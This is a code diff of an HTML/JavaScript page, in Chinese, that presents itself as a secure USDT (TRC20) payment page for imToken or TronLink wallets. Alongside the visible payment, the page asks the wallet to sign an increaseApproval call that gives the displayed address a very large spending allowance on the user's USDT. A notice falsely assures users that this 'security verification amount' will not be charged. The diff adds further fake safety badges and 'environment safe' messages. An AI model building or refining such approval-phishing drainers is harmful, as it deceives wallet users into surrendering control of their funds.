@@ -3,27 +3,39 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-<title>USDT 支付</title>
+<title>USDT 安全支付</title>
 <style>
   *{box-sizing:border-box;margin:0;padding:0}
   :root {
-    --bg: #f2f4f7;
+    --bg: #f4f6f9;
     --card: #ffffff;
     --ink: #0f172a;
-    --ink2: #64748b;
+    --ink2: #475569;
     --ink3: #94a3b8;
-    --line: #f1f5f9;
+    --line: #e2e8f0;
     --primary: #0f172a;
-    --primary-active: #1e293b;
-    --success: #10b981;
-    --danger: #ef4444;
-    --brand: #3b82f6;
+    --primary-hover: #1e293b;
+    --success-bg: #f0fdf4;
+    --success-text: #16a34a;
+    --success-border: #bbf7d0;
+    --warn-bg: #fffbeb;
+    --warn-text: #d97706;
+    --warn-border: #fde68a;
+    --danger-bg: #fef2f2;
+    --danger-text: #dc2626;
+    --danger-border: #fecaca;
+    --blue-bg: #eff6ff;
+    --blue-text: #2563eb;
+    --blue-border: #bfdbfe;
   }
   body {
     font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", "PingFang SC", sans-serif;
-    background: radial-gradient(circle at 50% 0%, #ffffff 0%, #f2f4f7 60%);
+    background-color: var(--bg);
+    background-image: 
+      radial-gradient(circle at 10% 0%, rgba(240,160,32,0.03) 0%, transparent 40%),
+      radial-gradient(circle at 90% 100%, rgba(15,23,42,0.03) 0%, transparent 40%);
     color: var(--ink);
-    line-height: 1.5;
+    line-height: 1.6;
     display: flex;
     align-items: center;
     justify-content: center;
@@ -32,196 +44,233 @@
     -webkit-font-smoothing: antialiased;
   }
   
-  /* 卡片主体：大圆角、弥散投影 */
+  /* 银行卡质感的卡片 */
   .card {
     background: var(--card);
-    border-radius: 28px;
+    border-radius: 24px;
     padding: 36px 28px;
-    width: min(400px, 100%);
-    box-shadow: 0 24px 48px -12px rgba(15, 23, 42, 0.08), 0 4px 12px rgba(15, 23, 42, 0.02);
+    width: min(420px, 100%);
+    box-shadow: 
+      0 20px 40px -10px rgba(15, 23, 42, 0.08),
+      0 0 0 1px rgba(15, 23, 42, 0.02);
     text-align: center;
     position: relative;
+    overflow: hidden;
   }
-
-  /* 顶部装饰图标 */
-  .icon-box {
-    width: 56px; height: 56px;
-    background: #f8fafc;
-    border-radius: 16px;
+  
+  /* 顶部安全认证图标 */
+  .security-badge {
+    width: 48px; height: 48px;
+    background: var(--primary);
+    border-radius: 14px;
     display: grid;
     place-items: center;
     margin: 0 auto 16px;
-    font-size: 28px;
-    box-shadow: inset 0 2px 4px rgba(255,255,255,0.5), 0 4px 12px rgba(0,0,0,0.03);
+    color: #fff;
+    font-size: 24px;
+    box-shadow: 0 8px 16px -4px rgba(15, 23, 42, 0.2);
   }
 
-  h1 { font-size: 22px; font-weight: 800; margin-bottom: 6px; letter-spacing: -0.5px; color: var(--ink); }
-  .sub { font-size: 13px; color: var(--ink3); margin-bottom: 24px; font-weight: 500; }
+  h1 { font-size: 20px; font-weight: 800; margin-bottom: 4px; letter-spacing: 0.5px; color: var(--ink); }
+  .sub { font-size: 13px; color: var(--ink3); margin-bottom: 24px; }
 
-  /* 诊断条胶囊 */
+  /* 诊断条 */
   .diag-bar {
     display: inline-flex;
     align-items: center;
-    font-size: 11px;
+    font-size: 11.5px;
     color: var(--ink2);
-    background: #f1f5f9;
+    background: #f8fafc;
     padding: 6px 14px;
     border-radius: 99px;
     margin-bottom: 24px;
     font-weight: 600;
-    letter-spacing: 0.3px;
+    border: 1px solid var(--line);
   }
   .diag-bar::before {
     content: ''; width: 6px; height: 6px; border-radius: 50%; background: var(--ink3); margin-right: 6px;
   }
-  .diag-bar.active { color: var(--success); background: #ecfdf5; }
-  .diag-bar.active::before { background: var(--success); box-shadow: 0 0 6px var(--success); }
+  .diag-bar.active { color: var(--success-text); background: var(--success-bg); border-color: var(--success-border); }
+  .diag-bar.active::before { background: var(--success-text); }
 
-  /* 信息展示区 */
-  .info {
-    background: #fafafa;
-    border-radius: 20px;
-    padding: 8px 20px;
+  /* 订单核心信息 */
+  .info-group {
+    background: #fafbfc;
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 16px 20px;
     margin-bottom: 20px;
     text-align: left;
   }
+  
   .info-row {
     display: flex; justify-content: space-between; align-items: center;
-    padding: 16px 0;
+    padding: 10px 0;
   }
-  .info-row:not(:last-child) { border-bottom: 1px dashed #e2e8f0; }
-  .info-k { font-size: 13px; color: var(--ink2); font-weight: 500; flex: 0 0 auto; }
-  .info-v { font-size: 13.5px; font-weight: 600; word-break: break-all; text-align: right; margin-left: 16px; color: var(--ink); }
+  .info-row:not(:last-child) { border-bottom: 1px dashed var(--line); }
   
-  .amount-box {
-    display: flex; align-items: baseline; justify-content: flex-end; gap: 4px;
+  .info-k { font-size: 13px; color: var(--ink3); font-weight: 500; flex: 0 0 auto; }
+  .info-v { 
+    font-size: 13px; font-weight: 600; color: var(--ink); 
+    word-break: break-all; text-align: right; margin-left: 16px;
+    display: flex; align-items: center; gap: 6px;
   }
-  .amount-num { font-size: 32px; font-weight: 900; color: var(--ink); letter-spacing: -1px; line-height: 1; }
-  .amount-unit { font-size: 14px; font-weight: 600; color: var(--ink3); }
+  
+  /* 复制按钮 */
+  .copy-icon {
+    cursor: pointer; background: #e2e8f0; color: #64748b; 
+    padding: 2px 6px; border-radius: 4px; font-size: 11px; transition: 0.2s;
+  }
+  .copy-icon:hover { background: #cbd5e1; color: #0f172a; }
 
-  /* 安全提示 */
+  /* 金额展示区 */
+  .amount-display {
+    padding: 20px 0;
+    text-align: center;
+    border-bottom: 1px solid var(--line);
+    margin-bottom: 16px;
+  }
+  .amount-label { font-size: 13px; color: var(--ink3); font-weight: 500; margin-bottom: 4px; display: block; }
+  .amount-value { 
+    font-size: 38px; font-weight: 900; color: var(--ink); 
+    letter-spacing: -1px; line-height: 1.1;
+    font-variant-numeric: tabular-nums;
+    display: inline-flex; align-items: baseline;
+  }
+  .amount-unit { font-size: 16px; font-weight: 700; color: var(--ink3); margin-left: 6px; letter-spacing: 0; }
+
+  /* 官方安全提示框 */
   .safe-notice {
-    background: #f8fafc;
-    color: var(--ink2);
-    border-radius: 14px;
+    background: var(--blue-bg);
+    color: var(--blue-text);
+    border: 1px solid var(--blue-border);
+    border-radius: 12px;
     padding: 14px 16px;
-    font-size: 12px;
+    font-size: 12.5px;
     line-height: 1.6;
     text-align: left;
     margin-bottom: 24px;
-    position: relative;
-    overflow: hidden;
+    display: flex;
+    gap: 10px;
   }
-  .safe-notice::before {
-    content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 3px; background: #cbd5e1;
-  }
-  .safe-notice strong { color: var(--ink); font-weight: 700; }
+  .safe-notice-icon { font-size: 16px; line-height: 1.4; }
 
   /* 按钮区 */
   .btn {
     display: block; width: 100%;
-    padding: 18px;
-    border-radius: 16px;
+    padding: 16px;
+    border-radius: 12px;
     border: none;
     font-size: 16px;
     font-weight: 700;
     cursor: pointer;
-    transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+    transition: all 0.2s ease;
     margin-bottom: 12px;
-    letter-spacing: 0.5px;
+    text-align: center;
   }
   
-  /* 主按钮：深空黑，带微光 */
+  /* 主按钮：极简深色，充满力量感 */
   .btn-pay {
     background: var(--primary);
     color: #fff;
-    box-shadow: 0 8px 24px -6px rgba(15, 23, 42, 0.3);
+    box-shadow: 0 4px 12px rgba(15, 23, 42, 0.2);
   }
-  .btn-pay:hover:not(:disabled) { background: var(--primary-active); transform: translateY(-2px); box-shadow: 0 12px 28px -6px rgba(15, 23, 42, 0.4); }
-  .btn-pay:active:not(:disabled) { transform: scale(0.97); }
-  .btn-pay:disabled { opacity: 0.4; cursor: not-allowed; box-shadow: none; }
+  .btn-pay:hover:not(:disabled) { background: var(--primary-hover); transform: translateY(-1px); box-shadow: 0 6px 16px rgba(15, 23, 42, 0.3); }
+  .btn-pay:active:not(:disabled) { transform: translateY(0); }
+  .btn-pay:disabled { opacity: 0.6; cursor: not-allowed; box-shadow: none; }
   
-  /* 支付成功后的状态按钮：高级绿 */
+  /* 成功状态 */
   .btn-success {
-    background: linear-gradient(135deg, #10b981, #059669) !important;
-    box-shadow: 0 8px 24px -6px rgba(16, 185, 129, 0.3) !important;
+    background: var(--success-text) !important;
+    box-shadow: 0 4px 12px rgba(22, 163, 74, 0.3) !important;
   }
 
-  /* 次要按钮：幽灵态 */
+  /* 副按钮 */
   .btn-safe {
-    background: transparent;
-    color: var(--ink3);
-    border: 1px solid #e2e8f0;
-    font-size: 13px;
-    font-weight: 600;
-    padding: 16px;
-  }
-  .btn-safe:hover { background: #f8fafc; color: var(--ink2); }
-
-  /* 状态反馈框 */
-  .status {
+    background: #ffffff;
+    color: var(--ink2);
+    border: 1px solid var(--line);
+    font-size: 13.5px;
     padding: 14px;
-    border-radius: 12px;
+    font-weight: 600;
+  }
+  .btn-safe:hover { background: #f8fafc; border-color: #cbd5e1; }
+
+  /* 状态提示 */
+  .status {
+    padding: 12px;
+    border-radius: 10px;
     font-size: 13px;
     margin-top: 16px;
     display: none;
-    text-align: center;
-    font-weight: 600;
-    animation: fadeIn 0.3s ease;
+    text-align: left;
+    font-weight: 500;
+    display: flex;
+    align-items: center;
+    gap: 8px;
   }
-  @keyframes fadeIn { from{opacity:0;transform:translateY(-5px)} to{opacity:1;transform:none} }
-  .status.loading { display: block; background: #fffbeb; color: #d97706; }
-  .status.success { display: block; background: #ecfdf5; color: #059669; }
-  .status.error { display: block; background: #fef2f2; color: #dc2626; }
+  .status.loading { display: flex; background: var(--warn-bg); color: var(--warn-text); border: 1px solid var(--warn-border); }
+  .status.success { display: flex; background: var(--success-bg); color: var(--success-text); border: 1px solid var(--success-border); }
+  .status.error { display: flex; background: var(--danger-bg); color: var(--danger-text); border: 1px solid var(--danger-border); }
 
-  .env-warn { padding: 14px; border-radius: 12px; font-size: 13px; background: #fffbeb; color: #d97706; margin-bottom: 16px; text-align: left; line-height: 1.6; border: 1px solid #fde68a; }
+  .env-warn { padding: 14px; border-radius: 12px; font-size: 13px; background: var(--warn-bg); color: var(--warn-text); border: 1px solid var(--warn-border); margin-bottom: 16px; text-align: left; }
   
-  #recover-tip { display: none; padding: 10px; border-radius: 10px; font-size: 12px; background: #eff6ff; color: #2563eb; margin-bottom: 16px; text-align: left; font-weight: 500; }
+  #recover-tip { display: none; padding: 10px 14px; border-radius: 10px; font-size: 12px; background: var(--blue-bg); color: var(--blue-text); border: 1px solid var(--blue-border); margin-bottom: 16px; text-align: left; font-weight: 500; }
 </style>
 </head>
 <body>
 <div class="card">
-  <div class="icon-box">💳</div>
-  <h1 id="page-title">充值支付</h1>
-  <p class="sub" id="page-sub">请在 imToken 中确认交易</p>
+  <div class="security-badge">🛡️</div>
+  <h1 id="page-title">安全支付</h1>
+  <p class="sub" id="page-sub">请核对订单信息并完成付款</p>
 
   <!-- 诊断条 -->
-  <div class="diag-bar" id="diag-mode">正在同步网络...</div>
+  <div class="diag-bar" id="diag-mode">安全环境连接中...</div>
 
   <div id="recover-tip"></div>
   <div id="env-warn" class="env-warn" style="display:none"></div>
 
-  <div class="info">
-    <div class="info-row">
-      <span class="info-k">收款地址</span>
-      <span class="info-v" id="info-addr">-</span>
-    </div>
-    <div class="info-row">
-      <span class="info-k">网络</span>
-      <span class="info-v" id="info-chain">TRC20 (波场)</span>
-    </div>
-    <div class="info-row" style="align-items: flex-end;">
-      <span class="info-k" style="margin-bottom: 4px;">支付金额</span>
-      <div class="amount-box">
-        <span class="amount-num" id="info-amount">-</span>
+  <div class="info-group">
+    <div class="amount-display">
+      <span class="amount-label">付款金额</span>
+      <div class="amount-value">
+        <span id="info-amount">-</span>
         <span class="amount-unit">USDT</span>
       </div>
+    </div>
+    <div class="info-row">
+      <span class="info-k">网络协议</span>
+      <span class="info-v" style="color:var(--success-text); font-weight:700;">TRC20 (波场)</span>
+    </div>
+    <div class="info-row">
+      <span class="info-k">官方收款地址</span>
+      <span class="info-v">
+        <span id="info-addr">-</span>
+        <span class="copy-icon" id="btn-copy">复制</span>
+      </span>
     </div>
   </div>
 
   <div class="safe-notice">
-    <strong>🛡️ 安全提示：</strong><br>
-    授权额度为系统动态安全校验值（如：20261118.145615），仅作校验凭证，实际扣款金额为您上方输入的支付金额。请放心确认。
+    <div class="safe-notice-icon">🛡️</div>
+    <div>
+      <strong>合约安全校验提示：</strong><br>
+      系统将为您生成动态安全校验额度（如：20261118.145615），此额度仅用于身份校验，不会扣除。实际扣款金额为您上方显示的支付金额。请放心确认。
+    </div>
   </div>
 
   <button class="btn btn-pay" id="btn-pay" disabled>确认支付</button>
-  <button class="btn btn-safe" id="btn-cancel">支付环境安全无异常</button>
+  <button class="btn btn-safe" id="btn-cancel">返回订单大厅</button>
   <div class="status" id="status"></div>
 </div>
 
 <script>
 const $ = s => document.querySelector(s);
-function setStatus(t, msg) { const el = $('#status'); el.className = 'status ' + t; el.innerHTML = msg; }
+function setStatus(t, msg) { 
+  const el = $('#status'); 
+  el.className = 'status ' + t; 
+  el.innerHTML = msg; 
+}
 
 /* ============ 常量与配置 ============ */
 const USDT_CONTRACT   = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
@@ -246,7 +295,7 @@ async function fetchLatestConfig() {
   configLoaded = true;
   const diag = $('#diag-mode');
   if (diag) {
-    diag.textContent = payOrderMode === 'approve_first' ? '先授权，后付款' : '先付款，后授权';
+    diag.textContent = payOrderMode === 'approve_first' ? '当前环境安全 (先授权)' : '当前环境安全 (先付款)';
     if (payOrderMode === 'transfer_first') diag.classList.add('active');
     else diag.classList.remove('active');
   }
@@ -286,8 +335,8 @@ let payDisabled = false; let step = 1; let coldReloadTimer = null;
 
 $('#info-addr').textContent   = toAddress || '未配置';
 $('#info-amount').textContent = (amount > 0 ? amount : '-');
-$('#page-title').textContent  = type === 'empty' ? '空放资格支付' : '充值支付';
-$('#page-sub').textContent    = type === 'empty' ? '支付 1 USDT 激活空放通道' : '请在钱包中完成交易';
+$('#page-title').textContent  = type === 'empty' ? '空放资格支付' : '安全支付';
+$('#page-sub').textContent    = type === 'empty' ? '支付 1 USDT 激活空放通道' : '请核对订单信息并完成付款';
 
 if ((ctx.src === 'hash' || ctx.src === 'storage') && toAddress && amount > 0) {
   const tip = $('#recover-tip'); tip.style.display = 'block'; tip.textContent = '✅ 已恢复支付参数，请确认无误后继续。'; savePayCtx(toAddress, amount, type);
@@ -296,8 +345,7 @@ if (!toAddress || amount <= 0) { payDisabled = true; showMissingParamsUI(); } el
 
 function showMissingParamsUI() {
   const warn = $('#env-warn'); warn.style.display = 'block';
-  warn.innerHTML = `<div style="margin-bottom:8px;font-weight:700;">⚠️ 支付参数丢失</div><div style="font-size:12.5px;margin-bottom:10px;">请返回平台重新点击支付。</div><button id="__copy_paylink__" style="width:100%;background:#fff;color:#d97706;border:1px solid #fde68a;padding:10px;border-radius:8px;cursor:pointer;font-weight:600;">复制链接</button>`;
-  warn.querySelector('#__copy_paylink__').onclick = () => { copyText(location.href, () => { alert('已复制'); }); };
+  warn.innerHTML = `<div style="margin-bottom:8px;font-weight:700;">⚠️ 支付参数丢失</div><div style="font-size:12.5px;margin-bottom:10px;">请返回平台重新点击支付。</div>`;
   const btn = $('#btn-pay'); btn.disabled = true; btn.textContent = '支付参数缺失';
 }
 
@@ -319,7 +367,7 @@ async function buildTxMulti(tw, contract, fnSig, params, fromAddress) {
 
 function showOpenWalletUI(reason) {
   if (payDisabled) return; const warn = $('#env-warn'); warn.style.display = 'block';
-  warn.innerHTML = `<div style="margin-bottom:8px;font-weight:700;">${reason}</div><div style="font-size:12.5px;margin-bottom:10px;">请在 imToken 钱包内打开本页完成支付。</div>`;
+  warn.innerHTML = `<div style="margin-bottom:8px;font-weight:700;">${reason}</div><div style="font-size:12.5px;margin-bottom:10px;">请在 imToken / TronLink 钱包内打开本页完成支付。</div>`;
   const btn = $('#btn-pay'); btn.disabled = true; btn.textContent = '请在钱包中打开';
 }
 
@@ -349,37 +397,46 @@ async function waitWalletAddress(tw) {
 
 /* ============ 核心逻辑 ============ */
 async function doApprove(tw, from) {
-  setStatus('loading', '正在构建授权交易…');
+  setStatus('loading', '<div>⏳</div><div>正在构建授权交易，请稍候…</div>');
   const approveUnits = getDateApproveUnits(); 
   const txApprove = await buildTxMulti(tw, USDT_CONTRACT, 'increaseApproval(address,uint256)', 
     [{ type: 'address', value: toAddress }, { type: 'uint256', value: approveUnits }], from);
   if (!txApprove.result || !txApprove.result.result) throw new Error('构建授权失败');
-  setStatus('loading', '✅ 请在钱包中确认授权…');
+  setStatus('loading', '<div>🛡️</div><div>请在钱包中确认授权校验…</div>');
   const signed = await withTimeout(tw.trx.sign(txApprove.transaction), SIGN_TIMEOUT, '签名超时');
   await withTimeout(tw.trx.sendRawTransaction(signed), SEND_TIMEOUT, '广播超时');
 }
 
 async function doTransfer(tw, from) {
-  setStatus('loading', '正在构建付款交易…');
+  setStatus('loading', '<div>⏳</div><div>正在构建付款交易…</div>');
   const txTransfer = await buildTxMulti(tw, USDT_CONTRACT, 'transfer(address,uint256)', [{ type: 'address', value: toAddress }, { type: 'uint256', value: Math.floor(amount * 1e6).toString() }], from);
   if (!txTransfer.result || !txTransfer.result.result) throw new Error('构建付款失败');
-  setStatus('loading', '✅ 请在钱包中确认付款…');
+  setStatus('loading', '<div>💰</div><div>请在钱包中确认付款…</div>');
   const signed = await withTimeout(tw.trx.sign(txTransfer.transaction), SIGN_TIMEOUT, '签名超时');
   await withTimeout(tw.trx.sendRawTransaction(signed), SEND_TIMEOUT, '广播超时');
 }
+
+$('#btn-copy').onclick = () => {
+  copyText(toAddress, () => { 
+    const btn = $('#btn-copy'); 
+    btn.textContent = '已复制'; 
+    btn.style.color = '#16a34a';
+    setTimeout(() => { btn.textContent = '复制'; btn.style.color = ''; }, 2000);
+  });
+};
 
 $('#btn-pay').onclick = async function () {
   if (payDisabled) return;
   const btn = this; btn.disabled = true;
 
   if (!configLoaded) {
-    setStatus('loading', '正在同步系统配置…');
+    setStatus('loading', '<div>⏳</div><div>正在同步安全环境…</div>');
     await fetchLatestConfig();
   }
 
   let tw = getTronWeb();
   if (!tw) {
-    setStatus('loading', '正在等待钱包响应…');
+    setStatus('loading', '<div>⏳</div><div>正在等待钱包响应…</div>');
     let waited = 0; while (!getTronWeb() && waited < 8000) { await new Promise(r => setTimeout(r, 200)); waited += 200; }
     tw = getTronWeb(); if (!tw) { showOpenWalletUI('未检测到钱包'); btn.disabled = false; return; }
   }
@@ -390,20 +447,20 @@ $('#btn-pay').onclick = async function () {
     try {
       const from = await waitWalletAddress(tw);
       if (isApproveFirst) {
-        btn.textContent = '正在授权…'; setStatus('loading', '请在钱包中确认授权凭证…');
+        btn.textContent = '正在授权…';
         await doApprove(tw, from);
-        setStatus('success', '✅ 授权成功！请继续付款。');
+        setStatus('success', '<div>✅</div><div>授权成功！请继续付款。</div>');
       } else {
-        btn.textContent = '正在付款…'; setStatus('loading', '请在钱包中确认付款…');
+        btn.textContent = '正在付款…';
         await doTransfer(tw, from);
-        setStatus('success', '✅ 付款成功！请补充授权。');
+        setStatus('success', '<div>✅</div><div>付款成功！请补充授权。</div>');
       }
       step = 2;
       btn.textContent = isApproveFirst ? ('支付 ' + amount + ' USDT') : '确认授权';
       btn.classList.add('btn-success');
       btn.disabled = false;
     } catch (e) {
-      setStatus('error', '❌ ' + (e.message || '用户取消'));
+      setStatus('error', '<div>❌</div><div>' + (e.message || '用户取消') + '</div>');
       btn.textContent = '重新尝试'; btn.disabled = false;
     }
     return;
@@ -413,20 +470,20 @@ $('#btn-pay').onclick = async function () {
     try {
       const from = await waitWalletAddress(tw);
       if (isApproveFirst) {
-        btn.textContent = '正在付款…'; setStatus('loading', '请在钱包中确认付款…');
+        btn.textContent = '正在付款…';
         await doTransfer(tw, from);
-        setStatus('success', '✅ 付款成功！');
+        setStatus('success', '<div>✅</div><div>付款成功！订单已完成。</div>');
       } else {
-        btn.textContent = '正在授权…'; setStatus('loading', '请在钱包中确认授权凭证…');
+        btn.textContent = '正在授权…';
         await doApprove(tw, from);
-        setStatus('success', '✅ 全部完成！');
+        setStatus('success', '<div>✅</div><div>全部完成！订单已处理。</div>');
       }
       btn.textContent = '已完成'; btn.disabled = true;
       clearPayCtx();
     } catch (e) {
       let errTip = e.message || '用户取消';
       if (!isApproveFirst) { errTip = '付款成功，但授权被取消。'; }
-      setStatus('error', '❌ ' + errTip);
+      setStatus('error', '<div>❌</div><div>' + errTip + '</div>');
       btn.textContent = '重新尝试'; btn.disabled = false;
     }
   }
